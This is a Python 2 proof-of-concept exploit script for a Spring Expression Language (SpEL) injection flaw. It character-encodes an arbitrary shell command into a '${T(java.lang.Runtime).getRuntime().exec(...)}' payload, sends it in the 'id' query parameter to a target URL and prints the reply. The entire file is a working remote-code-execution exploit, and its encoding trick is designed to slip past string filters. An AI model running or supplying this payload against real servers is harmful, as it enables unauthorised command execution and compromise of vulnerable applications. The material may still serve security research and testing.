#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import os
import requests

def encode(cmd):
	# id
	# ${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(105).concat(T(java.lang.Character).toString(100)))}
	result = 'T(java.lang.Character).toString(%s)' % ord(cmd[0])
	for ch in cmd[1:]:
		result = result + '.concat(T(java.lang.Character).toString(%s))' % ord(ch)

	return '${T(java.lang.Runtime).getRuntime().exec(' + result + ')}'
	# return '${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(' + result + ').getInputStream())}'

def run(url, cmd):
	resp = requests.get('{}/?id={}'.format(url, encode(cmd)), headers = {'Accept': 'text/html'})

	print resp.text

if len(sys.argv) != 3:
	print 'Usage:', sys.argv[0], 'http://127.0.0.1:8080/', 'command_to_execute'
	sys.exit(0)

run(sys.argv[1], sys.argv[2])